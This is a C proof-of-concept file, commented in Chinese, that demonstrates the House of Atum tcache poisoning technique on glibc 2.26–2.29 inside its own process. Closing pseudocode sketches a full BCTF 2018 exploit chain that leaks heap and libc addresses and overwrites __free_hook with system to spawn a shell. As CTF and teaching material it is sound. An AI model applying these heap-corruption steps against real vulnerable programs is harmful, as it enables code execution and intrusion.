/*
 * House of Atum 的最小堆管理器 PoC，适用于 glibc 2.26～2.29。
 *
 * 原题在“只有两个对象可用”的限制下又混入了 fastbin，这里把真正决定
 * 版本边界的核心逻辑单独抽出来：2.29 及以前，__libc_malloc 只看
 * entries[idx] 是否非空，即使 counts[idx] 已经减到 0，也照样会继续
 * 调用 tcache_get 把伪节点取出来。
 *
 * 漏洞模型：edit-after-free，可以修改已释放 tcache chunk 里的 next 指针。
 * 最终效果：先正常取回 a，再让下一次 malloc 返回 a-0x10，也就是原本的
 * chunk header 位置。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    size_t *a;
    void *guard;
    size_t *first;
    size_t *header_as_user;

    setbuf(stdout, NULL);

    a = malloc(0x30);                 /* 物理 chunk size 为 0x40。 */
    guard = malloc(0x30);             /* 隔开 a 与 top，方便后面观察。 */
    if (a == NULL || guard == NULL)
        return 1;

    free(a);                          /* 此时 count=1，entries=a。 */

    /* 漏洞模拟：把 tcache_entry.next 改成原 chunk header 的地址。
     * 2.29 虽然有 key 检查，但这里只是 edit-after-free、没有再次
     * free，不会触发 double-free 扫描；第一次 tcache_get 还会顺便
     * 把 a->key 清零。
     */
    a[0] = (size_t)((char *)a - 0x10);

    first = malloc(0x30);             /* 返回 a；count 从 1 变成 0。 */
    assert(first == a);

    /* 关键差异在这里：2.26～2.29 只检查 entries != NULL，所以即使
     * count 已经是 0，entries 中残留的 a-0x10 仍会被消费掉。glibc
     * 2.30 改成检查 count>0 之后，流程会在这一步就停下来。
     */
    header_as_user = malloc(0x30);
    assert(header_as_user == (size_t *)((char *)a - 0x10));

    /* 拿到的返回值实际上是把 chunk header 当成了用户区；
     * header_as_user[1] 正是 a[-1] 的 size 字段，这里直接改写它，
     * 用来证明不是只是比较了一下地址就算数。
     */
    header_as_user[1] = 0x91;
    assert(a[-1] == 0x91);

    printf("[+] Atum：块头=%p，大小=%#zx\n",
           (void *)header_as_user, a[-1]);
    return 0;
}

/*
 * ======================== 原题迁移伪代码 ========================
 *
 * 本 C 文件只隔离验证了 entry/count 错位这一个原语。BCTF 2018 原题还
 * 提供了“free 后不清槽位”的菜单语义，完整利用可以按下面的顺序理解：
 *
 *     申请 chunk0 和相邻的保护块；
 *     对 chunk0 反复执行 free-but-keep-pointer，制造出一个 tcache 自环；
 *     读取 chunk0 用户区里的 next 字段，借此拿到堆地址；
 *
 *     从 tcache 取回 chunk0，利用保留下来的指针修改相邻块的 size；
 *     把同一个物理块伪装成 0x91，填满对应的 tcache；
 *     再次 free，让它进入 unsorted bin；
 *     读取里面残留的 fd/bk，据此算出 libc 基址；
 *
 *     把物理块的 size 改回 0x51；
 *     对 fastbin/tcache 下毒，使某次分配正好落到 __free_hook 附近；
 *     写入 system 地址，再申请一块并写入字符串 "/bin/sh"；
 *     最后 free 这个字符串块，触发调用。
 *
 * 这一整套步骤都绑定着题目自身的槽位生命周期和 glibc 2.26，不能把原题
 * 菜单调用原样当成一份通用 PoC 来用。glibc 2.30 改成先检查 counts>0
 * 之后，本文件验证的核心错位就无法继续被消费了。
 */
